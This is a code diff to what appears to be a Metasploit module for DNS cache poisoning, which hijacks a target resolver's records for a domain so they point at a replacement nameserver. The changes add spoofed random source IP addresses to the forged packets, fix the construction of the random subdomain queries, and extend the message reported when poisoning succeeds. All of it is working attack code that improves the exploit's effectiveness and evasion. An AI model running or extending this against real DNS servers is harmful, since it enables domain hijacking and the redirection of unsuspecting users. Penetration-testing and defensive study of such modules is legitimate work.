@@ -43,6 +43,7 @@ class Auxiliary::Spoof::Dns::BailiWickedDomain < Msf::Auxiliary
 			
 			register_options(
 				[
+					OptEnum.new('SRCADDR', [true, 'The source address to use for sending the queries', 'Real', ['Real', 'Random'], 'Real']),
 					OptPort.new('SRCPORT', [true, "The target server's source query port (0 for automatic)", nil]),
 					OptString.new('DOMAIN', [true, 'The domain to hijack', 'example.com']),
 					OptString.new('NEWDNS', [true, 'The hostname of the replacement DNS server', nil]),
@@ -136,6 +137,7 @@ class Auxiliary::Spoof::Dns::BailiWickedDomain < Msf::Auxiliary
 	def run
 		target  = rhost()
 		source  = Rex::Socket.source_address(target)
+		saddr   = datastore['SRCADDR']
 		sport   = datastore['SRCPORT']
 		domain  = datastore['DOMAIN'] + '.'
 		newdns  = datastore['NEWDNS']
@@ -279,10 +281,15 @@ class Auxiliary::Spoof::Dns::BailiWickedDomain < Msf::Auxiliary
 
 			req.rd = 1
 
+			src_ip = source
+			
+			if(saddr == 'Random')
+				src_ip = Rex::Text.rand_text(4).unpack("C4").join(".")
+			end
+			
 			buff = (
 				Scruby::IP.new(
-					#:src   => barbs[0][:addr].to_s,
-					:src   => source,
+					:src   => src_ip,
 					:dst   => target,
 					:proto => 17
 				)/Scruby::UDP.new(
@@ -350,7 +357,7 @@ class Auxiliary::Spoof::Dns::BailiWickedDomain < Msf::Auxiliary
 						answer = Resolv::DNS::Message.decode(answer)
 						answer.each_answer do |name, ttl, data|
 							if((name.to_s + ".") == domain and data.name.to_s == newdns)
-								print_status("Poisoning successful after #{queries} attempts: #{domain} == #{newdns}")
+								print_status("Poisoning successful after #{queries} queries and #{responses} responses: #{domain} == #{newdns}")
 								srv_sock.close
 								disconnect_ip
 								return
@@ -385,7 +392,7 @@ class Auxiliary::Spoof::Dns::BailiWickedDomain < Msf::Auxiliary
 
 		times   = []
 		
-		hostname = Rex::Text.rand_text_alphanumeric(16) + domain
+		hostname = Rex::Text.rand_text_alphanumeric(16) + '.' + domain
 				
 		sock = Rex::Socket.create_udp(
 			'PeerHost' => server,
@@ -413,7 +420,7 @@ class Auxiliary::Spoof::Dns::BailiWickedDomain < Msf::Auxiliary
 					times << [Time.now.to_f - q_beg_t, cnt]
 					cnt = 0
 					
-					hostname = Rex::Text.rand_text_alphanumeric(16) + domain
+					hostname = Rex::Text.rand_text_alphanumeric(16) + '.' + domain
 
 					Thread.critical = false
 					
